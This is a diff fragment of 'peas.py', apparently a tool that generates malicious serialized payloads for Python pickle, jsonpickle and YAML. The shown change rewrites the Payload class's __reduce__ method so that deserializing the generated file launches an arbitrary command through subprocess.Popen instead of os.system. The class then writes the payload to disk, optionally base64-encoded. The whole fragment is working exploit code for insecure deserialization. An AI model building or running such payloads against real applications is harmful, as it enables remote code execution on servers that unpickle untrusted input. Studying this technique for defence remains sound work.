@@ -3,11 +3,10 @@
 # Usage : python peas.py
 
 import pickle
-import os
 import base64
 import jsonpickle
 import yaml
-
+import subprocess
 
 class Payload(object):
 
@@ -17,7 +16,7 @@ class Payload(object):
         self.base = base
 
     def pick(self):
-        by = pickle.dumps(Payload(self.cmd, self.location, self.base))
+        by = pickle.dumps(Payload(tuple(self.cmd.split(" ")), self.location, self.base))
         by = self.verifyencoding(by)
         open(self.location.__add__("_pick"), "wb").write(by)
 
@@ -36,7 +35,7 @@ class Payload(object):
         return self+other
     
     def __reduce__(self):
-        return os.system, (self.cmd,)
+        return subprocess.Popen, (self.cmd,)
 
     def verifyencoding(self, s):
         if self.base :
